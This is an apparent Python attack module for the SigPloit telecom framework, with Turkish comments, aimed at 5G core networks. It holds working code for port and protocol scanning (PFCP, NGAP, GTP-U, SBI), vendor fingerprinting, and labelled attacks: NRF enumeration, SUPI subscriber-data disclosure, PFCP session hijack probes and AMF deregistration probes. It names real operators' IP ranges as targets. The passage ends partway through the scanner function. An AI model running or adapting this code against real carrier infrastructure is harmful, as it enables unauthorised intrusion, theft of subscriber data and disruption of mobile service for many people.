#!/usr/bin/env python3
"""
5G Core Network Security Module for SigPloit
==============================================
Comprehensive reconnaissance, scanning and security testing for 5G infrastructure.

Covers:
- HTTP/2 SBI (Service Based Interface) endpoint discovery
- NRF (Network Repository Function) discovery & abuse
- PFCP (Packet Forwarding Control Protocol) scanning - N4 interface
- NGAP (NG Application Protocol) scanning - N2 interface
- GTP-U (User Plane) scanning - N3 interface
- N32/SEPP roaming security checks
- Vendor/version fingerprinting
- Active security tests (SUPI disclosure, PFCP hijack, slice manipulation)

NOTE: 5G protocols are significantly more complex than SS7/Diameter.
      This module focuses on reconnaissance + known vulnerability checks.
"""
import sys
import os
import socket
import struct
import time
import json
import random
import datetime
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed


# ============================================
# UTILITY FUNCTIONS
# ============================================

def _get_input(prompt, default=None):
    """Guvenli input fonksiyonu."""
    if default is not None:
        data = input(f"{prompt} [{default}]: ").strip()
        return data if data else str(default)
    return input(f"{prompt}: ").strip()


def _prompt_int(prompt, default, min_val=0, max_val=65535):
    """Guvenli int input."""
    raw = _get_input(prompt, str(default))
    try:
        val = int(raw)
        if min_val <= val <= max_val:
            return val
        print(f"  [!] Deger {min_val}-{max_val} arasinda olmali, varsayilan kullaniliyor: {default}")
        return default
    except ValueError:
        print(f"  [!] Gecersiz sayi, varsayilan kullaniliyor: {default}")
        return default


def _is_valid_ip(ip):
    """IP adresi dogrula."""
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False


# ============================================
# 5G NF (Network Function) Types & Ports
# ============================================

NF_TYPES = {
    'NRF':  {'description': 'Network Repository Function',       'default_port': 8443,  'sbi_port': 29510, 'path': '/nnrf-disc/v1/nf-instances'},
    'AMF':  {'description': 'Access and Mobility Management',    'default_port': 8443,  'sbi_port': 29518, 'path': '/namf-comm/v1/'},
    'SMF':  {'description': 'Session Management Function',       'default_port': 8443,  'sbi_port': 29502, 'path': '/nsmf-pdusession/v1/'},
    'UDM':  {'description': 'Unified Data Management',           'default_port': 8443,  'sbi_port': 29503, 'path': '/nudm-sdm/v2/'},
    'AUSF': {'description': 'Authentication Server Function',    'default_port': 8443,  'sbi_port': 29509, 'path': '/nausf-auth/v1/'},
    'PCF':  {'description': 'Policy Control Function',           'default_port': 8443,  'sbi_port': 29507, 'path': '/npcf-smpolicycontrol/v1/'},
    'UPF':  {'description': 'User Plane Function',               'default_port': 8805,  'sbi_port': None,  'path': None},   # PFCP, not HTTP
    'NSSF': {'description': 'Network Slice Selection Function',  'default_port': 8443,  'sbi_port': 29531, 'path': '/nnssf-nsselection/v2/'},
    'NEF':  {'description': 'Network Exposure Function',         'default_port': 8443,  'sbi_port': 29551, 'path': '/3gpp-monitoring-event/v1/'},
    'SEPP': {'description': 'Security Edge Protection Proxy',    'default_port': 443,   'sbi_port': None,  'path': '/n32f-handshake/v1/'},
}

# 3GPP TS 29.5xx compliant SBI API paths
SBI_PATHS = [
    # NRF
    '/nnrf-disc/v1/nf-instances',
    '/nnrf-nfm/v1/nf-instances',
    '/nnrf-nfm/v1/subscriptions',
    # AMF
    '/namf-comm/v1/ue-contexts',
    '/namf-evts/v1/subscriptions',
    '/namf-loc/v1/provide-pos-info',
    # SMF
    '/nsmf-pdusession/v1/sm-contexts',
    '/nsmf-event-exposure/v1/subscriptions',
    # UDM
    '/nudm-sdm/v2/shared-data',
    '/nudm-uecm/v1/registrations',
    '/nudm-ueau/v1/suci-supi-translation',
    # AUSF
    '/nausf-auth/v1/ue-authentications',
    # PCF
    '/npcf-smpolicycontrol/v1/sm-policies',
    '/npcf-am-policy-control/v1/policies',
    # NSSF
    '/nnssf-nsselection/v2/network-slice-information',
    # NEF
    '/nnef-eventexposure/v1/subscriptions',
    '/3gpp-monitoring-event/v1/',
    # SEPP / N32
    '/n32f-handshake/v1/exchange-capability',
    '/n32c-handshake/v1/exchange-params',
]

# Default ports to scan for 5G infrastructure
DEFAULT_5G_PORTS = [
    80, 443, 8080, 8443,                   # HTTP/HTTPS
    8805,                                    # PFCP (N4)
    38412, 38472,                            # NGAP (N2) / SCTP
    2152,                                    # GTP-U (N3)
    29510, 29518, 29502, 29503, 29507,       # 3GPP SBI ports
    29509, 29531, 29551,                     # More SBI ports
    9090, 9100, 5000, 3000,                  # Common management/dashboard
]

# Known 5G vendors/implementations fingerprints
VENDOR_SIGNATURES = {
    'free5gc':   ['free5GC', 'free5gc', 'f5gc'],
    'open5gs':   ['Open5GS', 'open5gs', 'nextepc'],
    'magma':     ['magma', 'Magma'],
    'nokia':     ['Nokia', 'nokia', 'NSB', 'CBIS'],
    'ericsson':  ['Ericsson', 'ericsson', 'ECEE', 'Cloud RAN'],
    'huawei':    ['Huawei', 'huawei', 'CloudCore'],
    'zte':       ['ZTE', 'zte', 'ZXUN'],
    'samsung':   ['Samsung', 'samsung', 'SEC'],
    'mavenir':   ['Mavenir', 'mavenir'],
    'affirmed':  ['Affirmed', 'affirmed', 'Microsoft Azure'],
    'cisco':     ['Cisco', 'cisco', 'StarOS'],
    'amarisoft':  ['Amarisoft', 'amarisoft', 'LTEENB'],
}

# Known 5G infrastructure (Turkey, USA, Germany operators)
KNOWN_5G_INFRA = {
    'Turkcell (TR)':   {'ranges': ['195.175.0.0/16', '88.253.0.0/16'], 'notes': '5G SA pilot 2021+'},
    'Vodafone TR':     {'ranges': ['176.240.0.0/16', '78.186.0.0/16'], 'notes': '5G NSA/SA'},
    'Turk Telekom':    {'ranges': ['85.29.0.0/16', '212.156.0.0/16'],  'notes': '5G planli'},
    'T-Mobile (US)':   {'ranges': ['172.32.0.0/16'],                    'notes': '5G SA aktif'},
    'Verizon (US)':    {'ranges': ['166.216.0.0/16'],                   'notes': '5G mmWave + Sub6'},
    'Deutsche Telekom': {'ranges': ['80.187.0.0/16'],                   'notes': '5G SA Europe'},
}


# ============================================
# LOW-LEVEL SCANNING FUNCTIONS
# ============================================

def _tcp_scan(ip, port, timeout=3):
    """TCP port tarama."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((ip, port))
        sock.close()
        return result == 0
    except Exception:
        return False


def _udp_probe(ip, port, data, timeout=3):
    """UDP probe gonder."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(timeout)
        sock.sendto(data, (ip, port))
        resp, addr = sock.recvfrom(4096)
        sock.close()
        return resp
    except Exception:
        return None


def _http_request(ip, port, path="/", use_tls=False, timeout=5):
    """HTTP/1.1 veya requests ile istek gonder."""
    result = {
        'status': 0, 'server': '', 'headers': {},
        'body': '', 'accessible': False, 'error': ''
    }

    # Try requests library first
    try:
        import requests
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

        scheme = "https" if use_tls else "http"
        url = f"{scheme}://{ip}:{port}{path}"
        headers = {
            'Accept': 'application/json',
            'User-Agent': 'SigPloit/5G-Scanner',
            'Content-Type': 'application/json',
        }
        resp = requests.get(url, timeout=timeout, verify=False, headers=headers)
        result['status'] = resp.status_code
        result['server'] = resp.headers.get('Server', '')
        result['headers'] = dict(resp.headers)
        result['body'] = resp.text[:2000]
        result['accessible'] = resp.status_code < 500
        return result
    except ImportError:
        pass
    except Exception as e:
        # requests failed, try raw socket
        pass

    # Fallback: raw socket
    sock = None
    try:
        import ssl

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)

        if use_tls:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=ip)

        sock.connect((ip, port))

        request = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {ip}:{port}\r\n"
            f"Accept: application/json\r\n"
            f"User-Agent: SigPloit/5G-Scanner\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        )
        sock.send(request.encode())

        response = b''
        while True:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
                if len(response) > 65536:
                    break
            except socket.timeout:
                break

        resp_text = response.decode('utf-8', errors='ignore')
        if 'HTTP/' in resp_text:
            status_line = resp_text.split('\r\n')[0]
            parts = status_line.split(' ', 2)
            if len(parts) >= 2:
                try:
                    result['status'] = int(parts[1])
                except ValueError:
                    pass

            # Parse headers
            header_section = resp_text.split('\r\n\r\n')[0] if '\r\n\r\n' in resp_text else ''
            for line in header_section.split('\r\n')[1:]:
                if ':' in line:
                    key, val = line.split(':', 1)
                    result['headers'][key.strip()] = val.strip()
                    if key.strip().lower() == 'server':
                        result['server'] = val.strip()

            # Get body
            if '\r\n\r\n' in resp_text:
                result['body'] = resp_text.split('\r\n\r\n', 1)[1][:2000]

            result['accessible'] = result['status'] < 500

    except ConnectionRefusedError:
        result['status'] = -1
        result['error'] = 'Connection refused'
    except socket.timeout:
        result['status'] = -2
        result['error'] = 'Timeout'
    except Exception as e:
        result['status'] = -3
        result['error'] = str(e)[:200]
    finally:
        if sock:
            try:
                sock.close()
            except Exception:
                pass

    return result


# ============================================
# PFCP PROTOCOL (N4 - SMF/UPF)
# ============================================

def build_pfcp_heartbeat():
    """Build a PFCP Heartbeat Request message (Type=1)."""
    seq = random.randint(1, 0xFFFFFF)

    # Recovery Time Stamp IE (Type=96, Length=4)
    ts = int(time.time()) - 2208988800  # NTP epoch offset
    recovery_ie = struct.pack('!HH', 96, 4) + struct.pack('!I', ts & 0xFFFFFFFF)

    # Sequence number (3 bytes) + spare (1 byte)
    seq_bytes = struct.pack('!I', seq)[1:4]  # Take last 3 bytes
    spare = b'\x00'

    msg_body = seq_bytes + spare + recovery_ie
    msg_len = len(msg_body)

    header = struct.pack('!BBH',
                         0x20,     # Version=1, MP=0, S=0
                         1,        # Type: Heartbeat Request
                         msg_len)

    return header + msg_body


def build_pfcp_association_setup(local_ip="1.2.3.4"):
    """Build a PFCP Association Setup Request (Type=5)."""
    seq = random.randint(1, 0xFFFFFF)

    # Node ID IE (Type=60, Length=5, Type=0=IPv4)
    node_id = struct.pack('!HH', 60, 5)
    node_id += struct.pack('!B', 0)  # IPv4 type
    node_id += socket.inet_aton(local_ip)

    # Recovery Time Stamp IE (Type=96, Length=4)
    ts = int(time.time()) - 2208988800
    recovery_ie = struct.pack('!HH', 96, 4) + struct.pack('!I', ts & 0xFFFFFFFF)

    # CP Function Features IE (Type=89, Length=1, value=0x01)
    features_ie = struct.pack('!HHB', 89, 1, 0x01)

    payload = node_id + recovery_ie + features_ie

    seq_bytes = struct.pack('!I', seq)[1:4]
    spare = b'\x00'

    msg_body = seq_bytes + spare + payload
    msg_len = len(msg_body)

    header = struct.pack('!BBH',
                         0x20,     # Version=1, MP=0, S=0
                         5,        # Type: Association Setup Request
                         msg_len)

    return header + msg_body


def parse_pfcp_response(data):
    """Parse PFCP response message."""
    result = {'type': 0, 'type_name': '', 'cause': 0, 'node_id': '', 'details': {}}

    if not data or len(data) < 8:
        return result

    # Parse header
    flags = data[0]
    msg_type = data[1]
    msg_len = struct.unpack('!H', data[2:4])[0]

    result['type'] = msg_type

    pfcp_types = {
        1: 'HeartbeatRequest', 2: 'HeartbeatResponse',
        5: 'AssociationSetupRequest', 6: 'AssociationSetupResponse',
        7: 'AssociationUpdateRequest', 8: 'AssociationUpdateResponse',
        9: 'AssociationReleaseRequest', 10: 'AssociationReleaseResponse',
        50: 'SessionEstablishmentRequest', 51: 'SessionEstablishmentResponse',
        52: 'SessionModificationRequest', 53: 'SessionModificationResponse',
        54: 'SessionDeletionRequest', 55: 'SessionDeletionResponse',
    }
    result['type_name'] = pfcp_types.get(msg_type, f'Unknown({msg_type})')

    # Parse IEs from body (after 4-byte seq+spare)
    if len(data) > 8:
        ie_data = data[8:]
        offset = 0
        while offset + 4 <= len(ie_data):
            ie_type = struct.unpack('!H', ie_data[offset:offset+2])[0]
            ie_len = struct.unpack('!H', ie_data[offset+2:offset+4])[0]
            ie_value = ie_data[offset+4:offset+4+ie_len]
            offset += 4 + ie_len

            # Cause IE (Type=19)
            if ie_type == 19 and ie_len >= 1:
                result['cause'] = ie_value[0]
                cause_names = {1: 'Request accepted', 64: 'Request rejected',
                               65: 'Session context not found', 66: 'Mandatory IE missing'}
                result['details']['cause_name'] = cause_names.get(ie_value[0], f'Code {ie_value[0]}')

            # Node ID IE (Type=60)
            elif ie_type == 60 and ie_len >= 5:
                node_type = ie_value[0]
                if node_type == 0 and ie_len >= 5:  # IPv4
                    result['node_id'] = socket.inet_ntoa(ie_value[1:5])
                elif node_type == 1 and ie_len >= 17:  # IPv6
                    result['node_id'] = socket.inet_ntop(socket.AF_INET6, ie_value[1:17])

    return result


def scan_pfcp(ip, port=8805, timeout=5):
    """Scan PFCP (N4) endpoint with heartbeat and association probes."""
    result = {
        'ip': ip, 'port': port,
        'heartbeat': False, 'association': False,
        'response_type': 0, 'node_id': '',
        'details': '', 'vulnerable': False,
    }

    # Heartbeat probe
    print(f"  [*] PFCP Heartbeat probe -> {ip}:{port}")
    hb_data = build_pfcp_heartbeat()
    resp = _udp_probe(ip, port, hb_data, timeout)
    if resp:
        parsed = parse_pfcp_response(resp)
        if parsed['type'] == 2:  # Heartbeat Response
            result['heartbeat'] = True
            result['node_id'] = parsed.get('node_id', '')
            result['details'] = "PFCP Heartbeat Response alindi"
            print(f"  \033[32m[+] PFCP Heartbeat yanit! Node: {result['node_id']}\033[0m")
        else:
            result['response_type'] = parsed['type']
            result['details'] = f"PFCP yanit: {parsed['type_name']}"
            print(f"  [*] PFCP yanit: {parsed['type_name']}")
    else:
        result['details'] = 'Heartbeat: Yanit yok'
        print(f"  [-] PFCP Heartbeat: Yanit yok")

    # Association Setup probe
    print(f"  [*] PFCP Association probe -> {ip}:{port}")
    assoc_data = build_pfcp_association_setup()
    resp = _udp_probe(ip, port, assoc_data, timeout)
    if resp:
        parsed = parse_pfcp_response(resp)
        if parsed['type'] == 6:  # Association Setup Response
            result['association'] = True
            cause = parsed.get('details', {}).get('cause_name', '')
            if parsed.get('cause') == 1:  # Accepted
                result['vulnerable'] = True
                result['details'] += f" | Association KABUL edildi! ({cause})"
                print(f"  \033[31m[!!!] PFCP Association kabul edildi! ZAFIYET!\033[0m")
            else:
                result['details'] += f" | Association yanit: {cause}"
                print(f"  \033[33m[!] PFCP Association yanit: {cause}\033[0m")
        else:
            result['details'] += f" | Assoc yanit: {parsed['type_name']}"

    return result


# ============================================
# NGAP SCANNING (N2 - gNB/AMF)
# ============================================

def build_ngap_setup_request():
    """Build minimal NGAP NG Setup Request (over SCTP-like TCP probe)."""
    # Simplified NGAP header for probing
    # This is a minimal probe to detect if NGAP is listening
    # Real NGAP requires SCTP which Python doesn't support natively
    #
    # We send an SCTP INIT chunk to test connectivity
    # SCTP Header: src_port(2) + dst_port(2) + verification_tag(4) + checksum(4)
    src_port = random.randint(10000, 60000)
    dst_port = 38412  # NGAP default
    v_tag = 0  # Must be 0 for INIT
    checksum = 0  # Will be wrong but enough to detect service

    header = struct.pack('!HHII', src_port, dst_port, v_tag, checksum)

    # SCTP INIT chunk: type(1)=1 + flags(1)=0 + length(2)=20 + init_tag(4) + a_rwnd(4) + streams(2+2) + init_tsn(4)
    init_tag = random.randint(1, 0xFFFFFFFF)
    a_rwnd = 65535
    os_streams = 1
    mis_streams = 1
    init_tsn = random.randint(1, 0xFFFFFFFF)

    init_chunk = struct.pack('!BBHIIHHH',
                             1, 0, 20,       # INIT chunk type, flags, length
                             init_tag, a_rwnd,
                             os_streams, mis_streams,
                             0)  # pad
    init_chunk += struct.pack('!I', init_tsn)

    return header + init_chunk


def scan_ngap(ip, port=38412, timeout=3):
    """Scan for NGAP (N2) interface."""
    result = {
        'ip': ip, 'port': port,
        'accessible': False, 'details': '',
    }

    # First try TCP connect (some implementations use TCP)
    if _tcp_scan(ip, port, timeout):
        result['accessible'] = True
        result['details'] = f"Port {port} acik (TCP)"
        print(f"  \033[32m[+] NGAP port {port} ACIK (TCP)\033[0m")
    else:
        result['details'] = f"Port {port} kapali veya SCTP-only"
        print(f"  [-] NGAP port {port}: TCP kapali (SCTP olabilir)")

    # Also check secondary NGAP port
    if port != 38472:
        if _tcp_scan(ip, 38472, timeout):
            result['accessible'] = True
            result['details'] += f" | Port 38472 acik"
            print(f"  \033[32m[+] NGAP port 38472 ACIK\033[0m")

    return result


# ============================================
# GTP-U SCANNING (N3 - UPF/gNB)
# ============================================

def scan_gtpu(ip, port=2152, timeout=3):
    """Scan for GTP-U (N3) user plane endpoint."""
    result = {
        'ip': ip, 'port': port,
        'accessible': False, 'details': '',
    }

    # Build GTP-U Echo Request (Type=1)
    # GTP-U Header: Flags(1) + Type(1) + Length(2) + TEID(4)
    teid = 0
    seq = random.randint(1, 0xFFFF)

    # Flags: Version=1, PT=1, E=0, S=1, PN=0 -> 0x32
    # Type: Echo Request = 1
    # Extension header: Seq(2) + N-PDU(1) + Next-ext(1) = 4 bytes
    ext = struct.pack('!HBB', seq, 0, 0)
    length = len(ext)

    header = struct.pack('!BBHI', 0x32, 1, length, teid)
    packet = header + ext

    resp = _udp_probe(ip, port, packet, timeout)
    if resp and len(resp) >= 8:
        resp_type = resp[1]
        if resp_type == 2:  # Echo Response
            result['accessible'] = True
            result['details'] = "GTP-U Echo Response alindi"
            print(f"  \033[32m[+] GTP-U Echo Response: {ip}:{port}\033[0m")
        else:
            result['accessible'] = True
            result['details'] = f"GTP-U yanit (type={resp_type})"
            print(f"  [*] GTP-U yanit (type={resp_type})")
    else:
        result['details'] = "GTP-U: Yanit yok"
        print(f"  [-] GTP-U: Yanit yok ({ip}:{port})")

    return result


# ============================================
# HTTP/2 SBI SCANNING
# ============================================

def scan_sbi_endpoint(ip, port, path, timeout=5, use_https=True):
    """Scan a 5G SBI endpoint."""
    result = {
        'ip': ip, 'port': port, 'path': path,
        'status': 0, 'server': '', 'body': '',
        'headers': {}, 'accessible': False, 'vendor': '',
    }

    http_result = _http_request(ip, port, path, use_tls=use_https, timeout=timeout)
    result['status'] = http_result['status']
    result['server'] = http_result['server']
    result['body'] = http_result['body']
    result['headers'] = http_result['headers']
    result['accessible'] = http_result['accessible']

    # Vendor fingerprinting
    if result['accessible']:
        combined_text = f"{result['server']} {result['body']} {json.dumps(result['headers'])}"
        result['vendor'] = _detect_vendor(combined_text)

    return result


def discover_nrf(ip, port=8443, timeout=5, use_https=True):
    """Discover NRF and list registered Network Functions."""
    print(f"\n[+] NRF Discovery: {ip}:{port}")

    paths = [
        '/nnrf-disc/v1/nf-instances?target-nf-type=AMF',
        '/nnrf-disc/v1/nf-instances?target-nf-type=SMF',
        '/nnrf-disc/v1/nf-instances?target-nf-type=UDM',
        '/nnrf-disc/v1/nf-instances?target-nf-type=AUSF',
        '/nnrf-disc/v1/nf-instances?target-nf-type=PCF',
        '/nnrf-nfm/v1/nf-instances',
    ]

    discovered_nfs = []

    for path in paths:
        result = scan_sbi_endpoint(ip, port, path, timeout, use_https)
        if result['accessible']:
            print(f"  \033[32m[+] {path}: HTTP {result['status']}\033[0m")
            if result['vendor']:
                print(f"      Vendor: {result['vendor']}")
            if result['body']:
                try:
                    data = json.loads(result['body'])
                    nf_instances = data.get('nfInstances', [])
                    if not nf_instances and isinstance(data, list):
                        nf_instances = data

                    for nf in nf_instances:
                        nf_info = {
                            'type': nf.get('nfType', 'Unknown'),
                            'id': nf.get('nfInstanceId', 'N/A'),
                            'status': nf.get('nfStatus', 'N/A'),
                            'ipv4': nf.get('ipv4Addresses', []),
                            'fqdn': nf.get('fqdn', ''),
                            'services': [s.get('serviceName', '') for s in nf.get('nfServices', [])],
                            'plmn': nf.get('plmnList', []),
                        }
                        discovered_nfs.append(nf_info)

                        print(f"    NF: {nf_info['type']:8s} | ID: {nf_info['id'][:16]}... | Status: {nf_info['status']}")
                        if nf_info['ipv4']:
                            print(f"       IP: {', '.join(str(x) for x in nf_info['ipv4'])}")
                        if nf_info['fqdn']:
                            print(f"       FQDN: {nf_info['fqdn']}")
                        if nf_info['services']:
                            print(f"       Services: {', '.join(nf_info['services'][:5])}")

                except json.JSONDecodeError:
                    print(f"    Yanit (JSON degil): {result['body'][:150]}")
        else:
            status_text = {-1: 'Reddedildi', -2: 'Zaman asimi', -3: 'Hata'}.get(result['status'], str(result['status']))
            print(f"  [-] {path}: {status_text}")

    return discovered_nfs


# ============================================
# SEPP/N32 SCANNING
# ============================================

def scan_sepp(ip, port=443, timeout=5):
    """Scan for SEPP (Security Edge Protection Proxy) on N32 interface."""
    result = {
        'ip': ip, 'port': port,
        'accessible': False, 'tls_info': '', 'details': '',
    }

    # Check TLS certificate
    try:
        import ssl
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        sock = socket.create_connection((ip, port), timeout=timeout)
        ssock = ctx.wrap_socket(sock, server_hostname=ip)

        cert = ssock.getpeercert(binary_form=False)
        if cert:
            subject = dict(x[0] for x in cert.get('subject', ()))
            issuer = dict(x[0] for x in cert.get('issuer', ()))
            cn = subject.get('commonName', '')
            org = subject.get('organizationName', '')
            result['tls_info'] = f"CN={cn}, Org={org}, Issuer={issuer.get('organizationName', '')}"
            result['accessible'] = True
            print(f"  [+] TLS: CN={cn}, Org={org}")

            # Check for 5G-related info in cert
            san = cert.get('subjectAltName', ())
            for san_type, san_val in san:
                if any(x in san_val.lower() for x in ['5gc', 'sepp', 'nrf', 'amf', 'core']):
                    print(f"  \033[33m[!] 5G iliskili SAN: {san_val}\033[0m")

        ssock.close()
    except Exception as e:
        result['details'] = str(e)[:200]

    # N32 handshake endpoints
    n32_paths = [
        '/n32f-handshake/v1/exchange-capability',
        '/n32c-handshake/v1/exchange-params',
    ]
    for path in n32_paths:
        n32_result = _http_request(ip, port, path, use_tls=True, timeout=timeout)
        if n32_result['accessible']:
            result['accessible'] = True
            result['details'] += f" | N32 endpoint aktif: {path} (HTTP {n32_result['status']})"
            print(f"  \033[33m[!] N32/SEPP endpoint bulunan: {ip}:{port}{path}\033[0m")

    return result


# ============================================
# VENDOR FINGERPRINTING
# ============================================

def _detect_vendor(response_text):
    """Detect 5G vendor from response content."""
    if not response_text:
        return ''
    for vendor, signatures in VENDOR_SIGNATURES.items():
        for sig in signatures:
            if sig in response_text:
                return vendor
    return ''


# ============================================
# ACTIVE SECURITY TESTS
# ============================================

def attack_nrf_discovery(ip, port=8443, use_tls=True):
    """NRF Discovery Abuse - enumerate all registered NFs without auth."""
    print(f"\n\033[33m[ATTACK] NRF Discovery Abuse: {ip}:{port}\033[0m")
    print("[*] Tum NF turlerini sorgulama deneniyor...")

    nf_types = ['AMF', 'SMF', 'UDM', 'AUSF', 'PCF', 'NSSF', 'NEF', 'UPF', 'SEPP', 'NRF']
    all_nfs = []

    for nf_type in nf_types:
        path = f'/nnrf-disc/v1/nf-instances?target-nf-type={nf_type}'
        result = _http_request(ip, port, path, use_tls=use_tls, timeout=5)

        if result['accessible']:
            print(f"  \033[32m[+] {nf_type}: HTTP {result['status']}\033[0m")
            if result['body']:
                try:
                    data = json.loads(result['body'])
                    instances = data.get('nfInstances', [])
                    if isinstance(data, list):
                        instances = data
                    for nf in instances:
                        nf['_queried_type'] = nf_type
                        all_nfs.append(nf)
                        print(f"    -> {nf.get('nfType', '?')} | {nf.get('nfInstanceId', '?')[:16]}")
                        ips = nf.get('ipv4Addresses', [])
                        if ips:
                            print(f"       IP: {', '.join(str(x) for x in ips)}")
                except json.JSONDecodeError:
                    pass
        else:
            print(f"  [-] {nf_type}: Erisim yok")

    if all_nfs:
        print(f"\n\033[31m[!] ZAFIYET: {len(all_nfs)} NF instance auth olmadan kesfedildi!\033[0m")
        print("[!] NRF kimlik dogrulamasi eksik veya yanlis yapilandirilmis.")
    else:
        print("\n[+] NRF erisime kapali veya kimlik dogrulamasi aktif.")

    return all_nfs


def attack_supi_disclosure(ip, port=8443, use_tls=True, target_supi=None):
    """SUPI Disclosure - attempt to access subscriber data."""
    print(f"\n\033[33m[ATTACK] SUPI Disclosure: {ip}:{port}\033[0m")

    if not target_supi:
        target_supi = "imsi-286010000000001"  # Default Turkish IMSI format

    paths = [
        f'/nudm-sdm/v2/{target_supi}/nssai',
        f'/nudm-sdm/v2/{target_supi}/am-data',
        f'/nudm-sdm/v2/{target_supi}/smf-select-data',
        f'/nudm-uecm/v1/{target_supi}/registrations',
        f'/nudm-uecm/v1/{target_supi}/registrations/amf-3gpp-access',
        f'/nudm-ueau/v1/{target_supi}/security-information/generate-auth-data',
    ]

    disclosed = []
    for path in paths:
        result = _http_request(ip, port, path, use_tls=use_tls, timeout=5)
        if result['accessible'] and result['status'] < 400:
            print(f"  \033[31m[!!!] {path}: HTTP {result['status']}\033[0m")
            disclosed.append({'path': path, 'status': result['status'], 'body': result['body'][:500]})
        elif result['accessible']:
            print(f"  \033[33m[!] {path}: HTTP {result['status']} (erisim var, auth gerekli)\033[0m")
        else:
            print(f"  [-] {path}: Erisim yok")

    if disclosed:
        print(f"\n\033[31m[!] KRITIK ZAFIYET: {len(disclosed)} endpoint auth olmadan veri dondu!\033[0m")
    else:
        print("\n[+] SUPI verisi korunuyor veya UDM erisime kapali.")

    return disclosed


def attack_pfcp_session_hijack(ip, port=8805, target_teid=None):
    """PFCP Session Modification attempt - test if sessions can be hijacked."""
    print(f"\n\033[33m[ATTACK] PFCP Session Hijack Test: {ip}:{port}\033[0m")

    # First check if PFCP is responsive
    pfcp_result = scan_pfcp(ip, port, timeout=5)

    if not pfcp_result['heartbeat']:
        print("[-] PFCP yanit vermiyor, saldiri iptal.")
        return pfcp_result

    if pfcp_result['vulnerable']:
        print(f"\033[31m[!!!] PFCP Association auth olmadan kabul edildi!\033[0m")
        print("[!!!] Saldirgan UPF oturumlari manipule edebilir.")
        print("[!!!] Trafik yonlendirme, veri dinleme, DoS mumkun.")

        if target_teid:
            print(f"\n[*] TEID {target_teid} icin Session Modification probe...")
            # Build Session Modification Request (Type=52)
            # This is just a probe - we don't actually hijack
            seq = random.randint(1, 0xFFFFFF)
            seid = target_teid

            # Minimal Session Modification with SEID
            seq_bytes = struct.pack('!I', seq)[1:4]
            spare = b'\x00'

            # For S=1 (SEID present): flags=0x21
            seid_bytes = struct.pack('!Q', seid)

            msg_body = seid_bytes + seq_bytes + spare
            msg_len = len(msg_body)

            header = struct.pack('!BBH', 0x21, 52, msg_len)
            packet = header + msg_body

            resp = _udp_probe(ip, port, packet, timeout=5)
            if resp:
                parsed = parse_pfcp_response(resp)
                print(f"  [*] Session Modification yanit: {parsed['type_name']}")
                if parsed.get('cause') == 1:
                    print(f"  \033[31m[!!!] Session Modification KABUL edildi!\033[0m")
            else:
                print(f"  [-] Session Modification: Yanit yok")

    return pfcp_result


def attack_slice_manipulation(ip, port=8443, use_tls=True):
    """Network Slice information disclosure/manipulation test."""
    print(f"\n\033[33m[ATTACK] Slice Manipulation Test: {ip}:{port}\033[0m")

    results = []

    # Try NSSF endpoints
    paths = [
        '/nnssf-nsselection/v2/network-slice-information',
        '/nnssf-nsselection/v2/network-slice-information?nf-type=AMF',
        '/nnssf-nssaiavailability/v1/nssai-availability',
    ]

    for path in paths:
        result = _http_request(ip, port, path, use_tls=use_tls, timeout=5)
        if result['accessible']:
            print(f"  \033[33m[!] {path}: HTTP {result['status']}\033[0m")
            results.append(result)
            try:
                data = json.loads(result['body'])
                slices = data.get('allowedNssai', data.get('nsiInformation', []))
                if slices:
                    print(f"    Slice bilgisi bulundu: {json.dumps(slices)[:200]}")
            except (json.JSONDecodeError, TypeError):
                pass

    if results:
        print(f"\n\033[33m[!] {len(results)} slice endpoint erisime acik.\033[0m")
    else:
        print("\n[+] Slice endpointleri korunuyor.")

    return results


def attack_amf_deregistration(ip, port=8443, use_tls=True, target_supi=None):
    """AMF deregistration probe - test if UE can be deregistered."""
    print(f"\n\033[33m[ATTACK] AMF Deregistration Test: {ip}:{port}\033[0m")

    if not target_supi:
        target_supi = "imsi-286010000000001"

    # Check AMF communication endpoints
    paths = [
        '/namf-comm/v1/ue-contexts',
        f'/namf-comm/v1/ue-contexts/{target_supi}',
        f'/namf-comm/v1/ue-contexts/{target_supi}/transfer',
        '/namf-evts/v1/subscriptions',
    ]

    accessible_endpoints = []
    for path in paths:
        result = _http_request(ip, port, path, use_tls=use_tls, timeout=5)
        if result['accessible']:
            print(f"  \033[33m[!] {path}: HTTP {result['status']}\033[0m")
            accessible_endpoints.append({'path': path, 'status': result['status']})
        else:
            print(f"  [-] {path}: Erisim yok")

    if accessible_endpoints:
        print(f"\n\033[33m[!] {len(accessible_endpoints)} AMF endpoint erisime acik.\033[0m")
        print("[!] UE context manipulasyonu mumkun olabilir.")
    else:
        print("\n[+] AMF endpointleri korunuyor.")

    return accessible_endpoints


# ============================================
# COMPREHENSIVE SCANNER
# ============================================

def scan_5g_target(ip, ports=None, timeout=5, max_workers=10):
    """Comprehensive 5G scan of a single target."""
    if ports is None:
        ports = DEFAULT_5G_PORTS[:]

    results = {
        'ip': ip,
        'timestamp': datetime.datetime.now().isoformat(),
        'open_ports': [],
        'sbi_endpoints': [],
        'nrf_nfs': [],
        'pfcp': None,
        'ngap': None,
        'gtpu': None,
        'sepp': None,
        'vendor': '',
        'vulnerabilities': [],
    }

    print(f"\n{'='*60}")
    print(f" 5G Core Network Taramasi: {ip}")
    print(f" Zaman: {results['timestamp']}")
    print(f"{'='*60}")

    # Phase 1: Port scan
    print(f"\n[1/6] Port tarama ({len(ports)} port)...")
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {executor.submit(_tcp_scan, ip, port, min(timeout, 3)): port for port in ports}
        for future in as_completed(futures):
            port = futures[future]
            try:
                if future.result():
                    results['open_ports'].append(port)
                    print(f"  [+] Port {port}: ACIK")
            except Exception:
                pass

